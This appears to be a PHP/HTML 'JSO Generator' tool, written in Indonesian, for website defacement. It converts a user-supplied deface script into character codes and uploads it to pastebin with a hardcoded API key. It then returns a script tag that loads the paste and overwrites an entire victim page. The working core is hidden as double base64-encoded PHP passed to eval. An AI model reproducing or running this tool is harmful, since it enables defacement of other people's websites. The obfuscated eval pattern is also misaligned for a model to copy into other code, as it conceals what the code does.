<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>JSO Generator</title>
	<link href="https://fonts.googleapis.com/css?family=Fredoka+One&display=swap" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Caveat&display=swap" rel="stylesheet">
	<script type="text/javascript">
		function copy_text() {
			document.getElementById("pilih").select();
			document.execCommand("copy");
			alert("Text berhasil dicopy zeyenk");
		}
	</script>
	<style>
	body {
		background-color:#2C3A49;
		color:white;
		font-family: 'Fredoka One', cursive;
	}
	.head {
		font-family: 'Fredoka One', cursive;
		text-shadow: 4px 1px red;
	}
	.textarea {
		width: 200px;
		height: 100px;
		border-radius: 10px;
		border-style: unset;
	}
	.btn {
		border-radius: 3px;
		background-color: white;
		border-style: unset;
		font-family: 'Fredoka One', cursive;
	}
	.foot {
		font-family: 'Caveat', cursive;
		text-shadow: 4px 1px red;
	}
	.ress {
		font-size: 20px;
    	color: aqua;
		font-family: 'Fredoka One', cursive;
	}
	</style>
    <script>
		function runCharCodeAt() {
			input = document.charCodeAt.input.value;
			output = "";
			for(i=0; i<input.length; ++i) {
				if (output != "") output += ", ";
				output += input.charCodeAt(i);
			}
			document.charCodeAt.output.value = output;
		}
	</script>
</head>
<body>
<center>
<h1 class="head">Tools Jso Generator</h1>
<form name="charCodeAt" method="post">
		<textarea name="input" class="textarea" placeholder="Script Deface Lu Taroh Sini Zeyenk:3"></textarea><br><br>
		<input type="button" onclick="runCharCodeAt()" value="Convert" class="btn"><br><br>
		<textarea name="output" class="textarea"></textarea><br><br>
		<input type="submit" name="submit" value="Create" class="btn"><br><br>
</form>
<?php 

$code = 'JG5vZXIgPSAnYVdZZ0tHbHpjMlYwS0NSZlVFOVRWRnNuYzNWaWJXbDBKMTBwS1NCN0RRb0phV1lnS0dWdGNIUjVLQ1JmVUU5VFZGc25iM1YwY0hWMEoxMHBLU0I3RFFvSkNXVmphRzhnSWp4elkzSnBjSFErWVd4bGNuUW9KME52Ym5abGNuUWdSSFZzZFNCYVpYbGxibXM2TXljcE96d3ZjMk55YVhCMFBpSTdEUW9KZldWc2MyVjdEUW9OQ2lScGMya2dQU0FrWDFCUFUxUmJKMjkxZEhCMWRDZGRPdzBLSkhKaGJtUnZiU0E5SUhKaGJtUW9NU3dnT1RrNU9UazVPVGtwT3cwS0pHRndhVjlrWlhaZmEyVjVJQWtKQ1QwZ0p6WXpNMlpqWW1SaFkySm1aamd5WW1aa05XUmtPREl4WVRsbU9Ea3lNV1kzSnpzZ0x5OGdlVzkxY2lCaGNHbGZaR1YyWld4dmNHVnlYMnRsZVEwS0pHRndhVjl3WVhOMFpWOWpiMlJsSUFrSlBTQWlaRzlqZFcxbGJuUXVaRzlqZFcxbGJuUkZiR1Z0Wlc1MExtbHVibVZ5U0ZSTlREMVRkSEpwYm1jdVpuSnZiVU5vWVhKRGIyUmxLQ0l1SkdsemFTNGlLU0k3SUM4dklIbHZkWElnY0dGemRHVWdkR1Y0ZEEwS0pHRndhVjl3WVhOMFpWOXdjbWwyWVhSbElBa0pQU0FuTUNjN0lDOHZJREE5Y0hWaWJHbGpJREU5ZFc1c2FYTjBaV1FnTWoxd2NtbDJZWFJsRFFva1lYQnBYM0JoYzNSbFgyNWhiV1VKQ1FrOUlDUnlZVzVrYjIwN0lDOHZJRzVoYldVZ2IzSWdkR2wwYkdVZ2IyWWdlVzkxY2lCd1lYTjBaUTBLSkdGd2FWOXdZWE4wWlY5bGVIQnBjbVZmWkdGMFpTQUpDVDBnSjA0bk93MEtKR0Z3YVY5d1lYTjBaVjltYjNKdFlYUWdDUWs5SUNkMFpYaDBKenNOQ2lSaGNHbGZkWE5sY2w5clpYa2dDUWtKUFNBbkp6c2dMeThnYVdZZ1lXNGdhVzUyWVd4cFpDQnZjaUJsZUhCcGNtVmtJR0Z3YVY5MWMyVnlYMnRsZVNCcGN5QjFjMlZrTENCaGJpQmxjbkp2Y2lCM2FXeHNJSE53WVhkdUxpQkpaaUJ1YnlCaGNHbGZkWE5sY2w5clpYa2dhWE1nZFhObFpDd2dZU0JuZFdWemRDQndZWE4wWlNCM2FXeHNJR0psSUdOeVpXRjBaV1FOQ2lSaGNHbGZjR0Z6ZEdWZmJtRnRaUWtKQ1QwZ2RYSnNaVzVqYjJSbEtDUmhjR2xmY0dGemRHVmZibUZ0WlNrN0RRb2tZWEJwWDNCaGMzUmxYMk52WkdVSkNRazlJSFZ5YkdWdVkyOWtaU2drWVhCcFgzQmhjM1JsWDJOdlpHVXBPdzBLRFFva2RYSnNJQWtKQ1FrOUlDZG9kSFJ3Y3pvdkwzQmhjM1JsWW1sdUxtTnZiUzloY0drdllYQnBYM0J2YzNRdWNHaHdKenNOQ2lSamFDQUpDUWtKUFNCamRYSnNYMmx1YVhRb0pIVnliQ2s3RFFvTkNtTjFjbXhmYzJWMGIzQjBLQ1JqYUN3Z1ExVlNURTlRVkY5UVQxTlVMQ0IwY25WbEtUc05DbU4xY214ZmMyVjBiM0IwS0NSamFDd2dRMVZTVEU5UVZGOVFUMU5VUmtsRlRFUlRMQ0FuWVhCcFgyOXdkR2x2Ymoxd1lYTjBaU1poY0dsZmRYTmxjbDlyWlhrOUp5NGtZWEJwWDNWelpYSmZhMlY1TGljbVlYQnBYM0JoYzNSbFgzQnlhWFpoZEdVOUp5NGtZWEJwWDNCaGMzUmxYM0J5YVhaaGRHVXVKeVpoY0dsZmNHRnpkR1ZmYm1GdFpUMG5MaVJoY0dsZmNHRnpkR1ZmYm1GdFpTNG5KbUZ3YVY5d1lYTjBaVjlsZUhCcGNtVmZaR0YwWlQwbkxpUmhjR2xmY0dGemRHVmZaWGh3YVhKbFgyUmhkR1V1SnlaaGNHbGZjR0Z6ZEdWZlptOXliV0YwUFNjdUpHRndhVjl3WVhOMFpWOW1iM0p0WVhRdUp5WmhjR2xmWkdWMlgydGxlVDBuTGlSaGNHbGZaR1YyWDJ0bGVTNG5KbUZ3YVY5d1lYTjBaVjlqYjJSbFBTY3VKR0Z3YVY5d1lYTjBaVjlqYjJSbExpY25LVHNOQ21OMWNteGZjMlYwYjNCMEtDUmphQ3dnUTFWU1RFOVFWRjlTUlZSVlVrNVVVa0ZPVTBaRlVpd2dNU2s3RFFwamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreFBVRlJmVmtWU1FrOVRSU3dnTVNrN0lBMEtZM1Z5YkY5elpYUnZjSFFvSkdOb0xDQkRWVkpNVDFCVVgwNVBRazlFV1N3Z01DazdEUW9OQ2lSeVpYTndiMjV6WlNBZ0NRa0pQU0JqZFhKc1gyVjRaV01vSkdOb0tUc05DaVJvWVhOcGJDQTlJSE4wY2w5eVpYQnNZV05sS0Nkb2RIUndjem92TDNCaGMzUmxZbWx1TG1OdmJTY3NJQ2RvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY25MQ0FrY21WemNHOXVjMlVwT3cwS0pISmxjM0JoYXlBOUlDYzhjMk55YVhCMElIUjVjR1U5SW5SbGVIUXZhbUYyWVhOamNtbHdkQ0lnYzNKalBTSW5MaVJvWVhOcGJDNG5JajQ4TDNOamNtbHdkRDRuT3cwS0pHdHJJRDBnYUhSdGJITndaV05wWVd4amFHRnljeWdrY21WemNHRnJLVHNOQ21WamFHOGdJanhvTVNCamJHRnpjejBuY21WemN5YytVbVZ6ZFd4ME9qd3ZhREUrSWpzTkNtVmphRzhnSWp4cGJuQjFkQ0IwZVhCbFBTZDBaWGgwSnlCMllXeDFaVDBuSkd0ckp5QnBaRDBuY0dsc2FXZ25JSEpsWVdSdmJteDVJQzgrSWpzTkNtVmphRzhnSWp4aWRYUjBiMjRnZEhsd1pUMG5ZblYwZEc5dUp5QnZibU5zYVdOclBTZGpiM0I1WDNSbGVIUW9LU2MrUTI5d2VUd3ZZblYwZEc5dVBpSTdEUXA5ZlEwS1pXTm9ieUFpUEdneUlHTnNZWE56UFNkbWIyOTBKejVBTW1zeE9TQkRiMlJsWkNCQ2VTQk9iM0lnUVdodFlXUWdSblFnU205elpTQkhhV0p5WVc0OEwyZ3lQaUk3JzsNCmV2YWwoYmFzZTY0X2RlY29kZSgkbm9lcikpOw==';
eval(base64_decode($code));

?>
</body>
</html>